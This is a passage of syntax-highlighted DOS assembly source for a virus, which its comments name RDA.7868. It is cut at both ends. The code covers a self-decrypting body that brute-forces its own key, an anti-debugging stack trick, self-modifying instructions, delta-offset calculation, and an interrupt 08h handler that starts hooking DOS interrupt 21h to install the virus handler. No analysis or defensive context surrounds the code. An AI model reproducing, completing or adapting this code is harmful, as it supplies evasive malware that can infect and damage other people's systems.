        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">rda_findbeginning</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_first_dw_0</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">rda_prepare_forencdec</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_sp_storage</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">enc_dec_instr</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; antidebug</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

</span><span class="sc5">rda_loop_selection</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">rda_gotorealencdec</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11101001b</span><span class="sc0">       </span><span class="sc1">; JMP imm16 (opcode 0e9h)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">rda_notthisevol</span><span class="sc4">-</span><span class="sc5">rda_gotorealencdec</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">rda_gotorealencdec</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Eh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">off_to_table_2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_third_dw_0</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">restore_di_aft</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0bfh</span><span class="sc0">    </span><span class="sc1">; mov di</span><span class="sc0">
</span><span class="sc5">rda_off_todi</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFF0h</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_second_dw_0</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; lenght</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_end_basic_bodycode</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; what to enc</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0bah</span><span class="sc0">            </span><span class="sc1">; mov dx,</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">; key is placed here with</span><span class="sc0">
                        </span><span class="sc1">; the second push</span><span class="sc0">
</span><span class="sc5">rda_mathloopz</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">enc_dec_instr</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">; the real instruction is</span><span class="sc0">
                        </span><span class="sc1">; placed here via a push</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_end_basic_bodycode</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0ff80h</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">rda_mathloopz</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0bfh</span><span class="sc0">            </span><span class="sc1">; mov di,</span><span class="sc0">
</span><span class="sc5">restore_di_aft</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; stack again on right pos</span><span class="sc0">

</span><span class="sc5">rda_notthisevol</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">rda_end_loop_sel</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11101001b</span><span class="sc0">       </span><span class="sc1">; JMP imm16 (opcode 0e9h)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">rda_loop_selection</span><span class="sc4">-</span><span class="sc5">rda_end_loop_sel</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">rda_end_loop_sel</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">restore_di_aft</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_off_todi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_sp_storage</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; will calculate if the body was correctly decrypted returning in dx the calc</span><span class="sc0">
</span><span class="sc1">; value</span><span class="sc0">
</span><span class="sc5">rda_calculate_value_in_dx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_fourth_dw_0</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rtc_comm_routine</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">695Fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4653h</span><span class="sc0">

</span><span class="sc5">rda_calcloop1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFF0h</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">rda_init_storage_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; an instruction from the rda_table_part_1 will</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; be placed here (the second two bytes)</span><span class="sc0">
</span><span class="sc5">rda_init_storage_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; and here the first two bytes of the same entry of</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; before</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">rda_calcloop1</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_init_storage_1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_init_storage_2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; reset the ops and ret</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">             </span><span class="sc1">; call opcode</span><span class="sc0">


</span><span class="sc5">rda_delta_offset_calc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">      </span><span class="sc1">; usual delta offset calculation</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_delta_off_sub</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11101001b</span><span class="sc0">       </span><span class="sc1">; JMP imm16 (opcode 0e9h)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">rda_goentry_run</span><span class="sc4">-</span><span class="sc5">rda_reencrypt_and_redo</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">rda_reencrypt_and_redo</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">enc_dec_byte</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">; reencrypt</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rda_encdec_routine</span><span class="sc0">

</span><span class="sc5">rda_goentry_run</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_first_db_0</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">rda_norandom_reinit</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rda_get_datetime</span><span class="sc0">

</span><span class="sc5">rda_norandom_reinit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_modulusv</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random_value_with_modulus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_first_dw_0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">enc_dec_byte</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; decrypt</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rda_encdec_routine</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_modulusv2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random_value_with_modulus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; select one pair from the</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; table 1, replace and try</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">;to calculate</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_to_part_1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_init_storage_1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_init_storage_2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rda_calculate_value_in_dx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_end_basic_bodycode</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">rda_add_di_instr</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rda_checkvalue</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">; decrypted succeully?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">rda_end_basic_bodycode</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11101001b</span><span class="sc0">       </span><span class="sc1">; JMP imm16 (opcode 0e9h)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">rda_reencrypt_and_redo</span><span class="sc4">-</span><span class="sc5">rda_end_basic_bodycode</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">rda_end_basic_bodycode</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ok, so it's decrypted ok</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">             </span><span class="sc1">; and we can proceed</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; variable number of do nothing</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; ops to change offset of the</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; stored calc value will be</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; stored. in virus body just to</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; pad the lenght to 10h boundary</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">             </span><span class="sc1">; for ECC use</span><span class="sc0">
</span><span class="sc1">; rda basic body end.</span><span class="sc0">

</span><span class="sc5">int08_virus</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Interrupt 08h of RDA.7868</span><span class="sc0">
</span><span class="sc5">int08_patch</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">           </span><span class="sc1">; Offset of interrupt 08h patching</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int08_stat</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0"> </span><span class="sc1">; Restore interrupt 21h?</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">int08_exit_</span><span class="sc0">     </span><span class="sc1">; Not zero? Jump to int08_exit_</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">        </span><span class="sc1">; Save registers from stack</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero AX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DS = segment of interrupt table</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[(</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">++</span><span class="sc2">02h</span><span class="sc4">)],</span><span class="sc2">800h</span><span class="sc0">
         </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">int08_exit</span><span class="sc0">      </span><span class="sc1">; Above? Jump to int08_exit</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int08_stat</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0"> </span><span class="sc1">; Don't restore interrupt 21h</span><span class="sc0">

         </span><span class="sc6">les</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[(</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">)]</span><span class="sc0">   </span><span class="sc1">; ES:AX = address of interrupt 21h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21_addr</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21_addr</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21_addr_</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21_addr_</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[(</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">)],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int21_virus</span><span class="sc0">
